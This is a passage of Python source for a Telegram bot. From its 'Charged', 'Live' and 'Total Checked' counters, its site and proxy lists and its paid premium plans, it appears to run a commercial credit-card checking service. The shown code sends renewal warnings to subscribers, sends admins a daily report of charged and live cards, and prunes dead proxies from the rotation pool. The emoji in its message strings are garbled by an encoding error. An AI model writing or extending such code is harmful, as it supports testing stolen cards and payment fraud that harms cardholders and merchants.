    """Runs every 12 hours, warns users whose premium expires within 24h"""
    while True:
        try:
            await asyncio.sleep(12 * 3600)
            premium_data = load_premium_users()
            now = datetime.now()
            for uid_str, info in list(premium_data.items()):
                try:
                    expiry_dt = datetime.fromisoformat(info['expiry'])
                    hours_left = (expiry_dt - now).total_seconds() / 3600
                    if 0 < hours_left <= 24:
                        plan = get_user_plan_name(int(uid_str))
                        credits = get_user_credits(int(uid_str))
                        try:
                            await bot.send_message(int(uid_str), premium_emoji(
                                f"鈿狅笍 <b>Premium Expiry Warning!</b>\n\n"
                                f"馃搵 Plan: {plan}\n"
                                f"鈴� Expires in: {int(hours_left)}h\n"
                                f"馃挵 Credits left: {credits}\n\n"
                                f"Contact @Mydev1 to renew your plan!"
                            ), parse_mode='html')
                        except:
                            pass
                except:
                    pass
        except Exception as e:
            print(f"Expiry warning loop error: {e}")


# ========== BACKGROUND: DAILY REPORT TO ADMIN ==========

async def daily_report_loop():
    """Sends daily summary to all admins every 24 hours"""
    while True:
        try:
            await asyncio.sleep(24 * 3600)
            hit_data = load_hit_stats()
            premium_data = load_premium_users()
            sites = load_sites()
            proxies = load_proxies()

            total_charged = sum(v.get('charged', 0) for v in hit_data.values())
            total_approved = sum(v.get('approved', 0) for v in hit_data.values())
            total_checked = sum(v.get('total', 0) for v in hit_data.values())
            now = datetime.now()

            # Count expiring in 3 days
            expiring = sum(
                1 for info in premium_data.values()
                if 0 < (datetime.fromisoformat(info['expiry']) - now).days <= 3
            )

            report = f"""馃搳 <b>Daily Bot Report</b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
馃搮 Date: {now.strftime('%Y-%m-%d %H:%M')}

<b>馃挸 Checking Stats:</b>
鈥� 鉁� Charged: {total_charged}
鈥� 馃枻 Live: {total_approved}
鈥� 馃挸 Total Checked: {total_checked}

<b>馃懃 Users:</b>
鈥� Premium: {len(premium_data)}
鈥� Expiring in 3 days: {expiring}

<b>馃寪 Resources:</b>
鈥� Sites: {len(sites)}
鈥� Proxies: {len(proxies)}
鈥� Active Sessions: {len(active_sessions)}
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>"""

            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_message(admin_id, premium_emoji(report), parse_mode='html')
                except:
                    pass
        except Exception as e:
            print(f"Daily report error: {e}")


# ========== BACKGROUND: AUTO PROXY HEALTH CHECK ==========

async def proxy_health_loop():
    """Every 6 hours, remove dead proxies automatically"""
    while True:
        try:
            await asyncio.sleep(6 * 3600)
            proxies = load_proxies()
            if not proxies:
                continue

            alive = []
            dead_count = 0
            batch_size = 30

            for i in range(0, len(proxies), batch_size):
                batch = proxies[i:i+batch_size]
                tasks = [test_proxy(p) for p in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for res in results:
                    if isinstance(res, dict) and res.get('status') == 'alive':
                        alive.append(res['proxy'])
                    else:
                        dead_count += 1

            if dead_count > 0:
                async with aiofiles.open(PROXY_FILE, 'w') as f:
                    for p in alive:
                        await f.write(f"{p}\n")
                for admin_id in ADMIN_IDS:
                    try:
                        await bot.send_message(admin_id, premium_emoji(
                            f"馃攧 <b>Auto Proxy Cleanup</b>\n\n"
                            f"鉁� Alive: {len(alive)}\n"
                            f"鉂� Removed: {dead_count}"
                        ), parse_mode='html')
                    except:
                        pass
        except Exception as e:
            print(f"Proxy health loop error: {e}")

async def main():
    await resolve_chat_ids()
    asyncio.create_task(expiry_warning_loop())
    asyncio.create_task(daily_report_loop())
    asyncio.create_task(proxy_health_loop())
    print("鉁� Bot started successfully!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    with bot:
        bot.loop.run_until_complete(main())
